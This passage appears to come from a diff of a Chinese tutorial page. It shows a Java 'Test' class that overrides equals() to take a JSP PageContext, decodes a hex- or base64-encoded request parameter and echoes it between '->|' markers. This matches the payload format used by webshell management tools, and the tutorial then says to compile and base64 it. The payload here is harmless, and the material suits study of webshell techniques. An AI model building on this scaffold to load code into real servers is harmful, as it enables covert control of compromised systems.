-</span></span><span class="line"><span class="cl">    String EC(String s) throws Exception {
-</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)) return s;
-</span></span><span class="line"><span class="cl">        return new String(s.getBytes(), cs);
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    String decode(String str) throws Exception{
-</span></span><span class="line"><span class="cl">        if(encoder.equals(&#34;hex&#34;)){
-</span></span><span class="line"><span class="cl">            if(str==&#34;null&#34;||str.equals(&#34;null&#34;)){
-</span></span><span class="line"><span class="cl">                return &#34;&#34;;
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">            String hexString = &#34;0123456789ABCDEF&#34;;
-</span></span><span class="line"><span class="cl">            str = str.toUpperCase();
-</span></span><span class="line"><span class="cl">            ByteArrayOutputStream baos = new ByteArrayOutputStream(str.length()/2);
-</span></span><span class="line"><span class="cl">            String ss = &#34;&#34;;
-</span></span><span class="line"><span class="cl">            for (int i = 0; i &lt; str.length(); i += 2){
-</span></span><span class="line"><span class="cl">                ss = ss + (hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))) + &#34;,&#34;;
-</span></span><span class="line"><span class="cl">                baos.write((hexString.indexOf(str.charAt(i)) &lt;&lt; 4 | hexString.indexOf(str.charAt(i + 1))));
-</span></span><span class="line"><span class="cl">            }
-</span></span><span class="line"><span class="cl">            return baos.toString(&#34;UTF-8&#34;);
-</span></span><span class="line"><span class="cl">        }else if(encoder.equals(&#34;base64&#34;)){
-</span></span><span class="line"><span class="cl">            byte[] bt = null;
-</span></span><span class="line"><span class="cl">            sun.misc.BASE64Decoder decoder = new sun.misc.BASE64Decoder();
-</span></span><span class="line"><span class="cl">            bt = decoder.decodeBuffer(str);
-</span></span><span class="line"><span class="cl">            return new String(bt,&#34;UTF-8&#34;);
-</span></span><span class="line"><span class="cl">        }
-</span></span><span class="line"><span class="cl">        return str;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">    String test(String var0){
-</span></span><span class="line"><span class="cl">        return &#34;Hello&#34; + var0;
-</span></span><span class="line"><span class="cl">    }
-</span></span><span class="line"><span class="cl">}
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletRequest</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">ServletResponse</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">javax</span><span class="o">.</span><span class="n">servlet</span><span class="o">.</span><span class="n">jsp</span><span class="o">.</span><span class="n">PageContext</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">import</span> <span class="n">java</span><span class="o">.</span><span class="n">io</span><span class="o">.</span><span class="n">ByteArrayOutputStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">public</span> <span class="k">class</span> <span class="n">Test</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">String</span> <span class="n">encoder</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="ne">String</span> <span class="n">cs</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="err">@</span><span class="n">Override</span>
+</span></span><span class="line"><span class="cl">    <span class="n">public</span> <span class="n">boolean</span> <span class="n">equals</span><span class="p">(</span><span class="ne">Object</span> <span class="n">obj</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">PageContext</span> <span class="n">page</span> <span class="o">=</span> <span class="p">(</span><span class="n">PageContext</span><span class="p">)</span><span class="n">obj</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServletRequest</span> <span class="n">request</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">getRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">ServletResponse</span> <span class="n">response</span> <span class="o">=</span> <span class="n">page</span><span class="o">.</span><span class="n">getResponse</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoder</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;encoder&#34;</span><span class="p">)</span><span class="o">!=</span><span class="n">null</span><span class="err">?</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;encoder&#34;</span><span class="p">):</span><span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">cs</span><span class="o">=</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;charset&#34;</span><span class="p">)</span><span class="o">!=</span><span class="n">null</span><span class="err">?</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;charset&#34;</span><span class="p">):</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">output</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">StringBuffer</span> <span class="n">sb</span> <span class="o">=</span> <span class="n">new</span> <span class="n">StringBuffer</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">try</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">setContentType</span><span class="p">(</span><span class="s2">&#34;text/html&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">request</span><span class="o">.</span><span class="n">setCharacterEncoding</span><span class="p">(</span><span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span><span class="o">.</span><span class="n">setCharacterEncoding</span><span class="p">(</span><span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">var0</span> <span class="o">=</span> <span class="n">EC</span><span class="p">(</span><span class="n">decode</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">getParameter</span><span class="p">(</span><span class="s2">&#34;var0&#34;</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;&#34;</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;-&gt;&#34;</span> <span class="o">+</span> <span class="s2">&#34;|&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">test</span><span class="p">(</span><span class="n">var0</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">sb</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">            <span class="n">output</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;|&#34;</span> <span class="o">+</span> <span class="s2">&#34;&lt;-&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">page</span><span class="o">.</span><span class="n">getOut</span><span class="p">()</span><span class="o">.</span><span class="n">print</span><span class="p">(</span><span class="n">output</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="n">catch</span> <span class="p">(</span><span class="n">Exception</span> <span class="n">e</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sb</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="s2">&#34;ERROR&#34;</span> <span class="o">+</span> <span class="s2">&#34;:// &#34;</span> <span class="o">+</span> <span class="n">e</span><span class="o">.</span><span class="n">toString</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="bp">true</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">EC</span><span class="p">(</span><span class="ne">String</span> <span class="n">s</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="n">s</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">getBytes</span><span class="p">(),</span> <span class="n">cs</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">decode</span><span class="p">(</span><span class="ne">String</span> <span class="nb">str</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;hex&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span><span class="p">(</span><span class="nb">str</span><span class="o">==</span><span class="s2">&#34;null&#34;</span><span class="o">||</span><span class="nb">str</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;null&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">hexString</span> <span class="o">=</span> <span class="s2">&#34;0123456789ABCDEF&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">str</span> <span class="o">=</span> <span class="nb">str</span><span class="o">.</span><span class="n">toUpperCase</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">ByteArrayOutputStream</span> <span class="n">baos</span> <span class="o">=</span> <span class="n">new</span> <span class="n">ByteArrayOutputStream</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">length</span><span class="p">()</span><span class="o">/</span><span class="mi">2</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="ne">String</span> <span class="n">ss</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="p">(</span><span class="ne">int</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">str</span><span class="o">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">                <span class="n">ss</span> <span class="o">=</span> <span class="n">ss</span> <span class="o">+</span> <span class="p">(</span><span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">)))</span> <span class="o">+</span> <span class="s2">&#34;,&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">                <span class="n">baos</span><span class="o">.</span><span class="n">write</span><span class="p">((</span><span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span><span class="p">))</span> <span class="o">&lt;&lt;</span> <span class="mi">4</span> <span class="o">|</span> <span class="n">hexString</span><span class="o">.</span><span class="n">indexOf</span><span class="p">(</span><span class="nb">str</span><span class="o">.</span><span class="n">charAt</span><span class="p">(</span><span class="n">i</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))));</span>
+</span></span><span class="line"><span class="cl">            <span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">baos</span><span class="o">.</span><span class="n">toString</span><span class="p">(</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span><span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">encoder</span><span class="o">.</span><span class="n">equals</span><span class="p">(</span><span class="s2">&#34;base64&#34;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="n">byte</span><span class="p">[]</span> <span class="n">bt</span> <span class="o">=</span> <span class="n">null</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span> <span class="n">decoder</span> <span class="o">=</span> <span class="n">new</span> <span class="n">sun</span><span class="o">.</span><span class="n">misc</span><span class="o">.</span><span class="n">BASE64Decoder</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bt</span> <span class="o">=</span> <span class="n">decoder</span><span class="o">.</span><span class="n">decodeBuffer</span><span class="p">(</span><span class="nb">str</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">new</span> <span class="ne">String</span><span class="p">(</span><span class="n">bt</span><span class="p">,</span><span class="s2">&#34;UTF-8&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nb">str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="ne">String</span> <span class="n">test</span><span class="p">(</span><span class="ne">String</span> <span class="n">var0</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Hello&#34;</span> <span class="o">+</span> <span class="n">var0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
 </span></span></code></pre></td></tr></table>
 </div>
 </div><p>将其编译成class文件，base64后输出到Test.txt中</p>
